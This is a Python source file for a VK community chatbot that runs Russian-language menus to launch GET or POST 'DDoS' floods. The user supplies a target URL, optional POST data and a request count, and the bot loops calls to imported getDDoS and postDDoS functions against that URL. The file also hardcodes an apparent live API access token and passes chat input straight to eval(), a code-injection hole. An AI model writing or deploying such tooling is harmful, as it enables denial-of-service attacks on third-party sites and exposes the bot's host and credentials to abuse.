from vk_api import VkApi
from vk_api.longpoll import VkLongPoll, VkEventType
from POSTGET import postDDoS, getDDoS
from POSTGET import message

token = '4691d8f6706204dafcf4410fb911a1e515b2dcfde010bd34940b4e4388499a0f6f1ff452c28d91003cfce' # Community token

vk_session = VkApi(token=token) # "Run" your community
vk = vk_session.get_api() # Begin work with API
longpoll = VkLongPoll(vk_session) # Longpoll makes that community recive messagess

requestIsEnd = False

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#                                                             #
#       Here is very complicated part of code. There is       #
#       a lot of cycles and notifications. Don't try          #
#       to understand that. It's works and i am happy         #
#                                                             #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

def mainDDoS(): # Main function with notification
    try:
        # Shown all comands
        message('Выберите тип DDoS:')
        message('GET')
        message('POST')
        message('Для того чтобы выйти в главное меню введите "Выход"')
        for event in longpoll.listen(): # Wait for next command
            if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                if event.text == 'Назад': # If command is "Назад" notification and break cycle
                    message('Выберите тип DDoS:')
                    message('GET')
                    message('POST')
                    message('Для того чтобы выйти в главное меню введите "Выход"')
                    break
                elif event.text == 'Выход': # If command is "Выход" notification and break cycle
                    message('Выходим...')
                    break
                elif event.text == 'GET': # If command is "GET" enter in GET menu
                    message('Введите ссылку. Для того чтобы вернуться назад "Назад"') # To return - type "Назад"
                    for event in longpoll.listen():
                        if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                            if event.text == 'Назад': # If command is "Назад" notification and break cycle
                                message('Выберите тип DDoS:')
                                message('GET')
                                message('POST')
                                message('Для того чтобы выйти в главное меню введите "Выход"')
                                break
                            elif event.text == 'Выход': # If command is "Выход" notification and break cycle
                                message('Выберите тип DDoS:')
                                message('GET')
                                message('POST')
                                message('Для того чтобы выйти в главное меню введите "Выход"')
                                break
                            elif event.text != 'Назад': # If command is not "Назад" - remember last string as url
                                url = event.text
                                message('Введите число запросов. Для того чтобы вернуться назад "Назад"')
                                for event in longpoll.listen(): # Wait for next command - count of repetitions
                                    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                        if event.text == 'Назад': # If command is "Назад" notification and break cycle
                                            message('Введите ссылку. Для того чтобы вернуться назад "Назад"')
                                            break
                                        elif event.text == 'Выход': # If command is "Выход" notification and break cycle
                                            message('Выходим...')
                                            break
                                        elif event.text != 'Назад': # If command is not "Назад" - notification and begin send requests
                                            message(url + ' - Идет DDoS...')
                                            for i in range(int(event.text)):
                                                getDDoS(url)
                                            # After end of DDoS type "Выход" to return in main menu
                                            message('DDoS закончен! Для выхода введите "Выход"')
                                            break
                elif event.text == 'POST': # if comand is POST - mutually exclusive with GET
                    message('Введите ссылку. Для того чтобы вернуться назад "Назад".')
                    for event in longpoll.listen():
                        if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                            if event.text == 'Назад': # If command is "Назад" notification and break cycle
                                message('Выберите тип DDoS:')
                                message('GET')
                                message('POST')
                                message('Для того чтобы выйти в главное меню введите "Выход"')
                                break
                            elif event.text == 'Выход': # If command is "Выход" notification and break cycle
                                message('Выберите тип DDoS:')
                                message('GET')
                                message('POST')
                                message('Для того чтобы выйти в главное меню введите "Выход"')
                                break
                            elif event.text != 'Назад': # If command is not "Назад" - notification, reapet url and asks for a data tuple
                                url = event.text
                                message('Введите кортеж data. Для того чтобы вернуться назад "Назад"')
                                for event in longpoll.listen(): # Wait for next command
                                    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                        if event.text == 'Назад': # If command is "Назад" notification and break cycle
                                            message('Введите ссылку. Для того чтобы вернуться назад "Назад".')
                                            break
                                        elif event.text == 'Выход': # If command is "Выход" notification and break cycle
                                            message('Введите "Выход" еще раз')
                                            break
                                        elif event.text != 'Назад': # If command is not "Назад" - notification, reapet tuple as "data" and asks for count of repetitions
                                            data = event.text
                                            dict = eval(data)
                                            message('Введите число запросов. Для того чтобы вернуться назад "Назад"')
                                            for event in longpoll.listen(): # Wait next message
                                                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                                                    if event.text == 'Назад': # If command is "Назад" notification and break cycle
                                                        message('Введите кортеж data. Для того чтобы вернуться назад "Назад"')
                                                        break
                                                    elif event.text == 'Выход': # If command is "Выход" notification and break cycle
                                                        message('Выходим...')
                                                        break
                                                    elif event.text != 'Назад': # If command is not "Назад" - notification and begin send requests
                                                        print(dict)
                                                        message(url + ' - Идет DDoS...')
                                                        for i in range(int(event.text)):
                                                            postDDoS(url, dict)
                                                        # After end of DDoS type "Выход" 2 times to return in main menu
                                                        message('DDoS закончен! Для выхода введите "Выход"')
                                                        break
    except:
        message('Произошла ошибка.')
        pass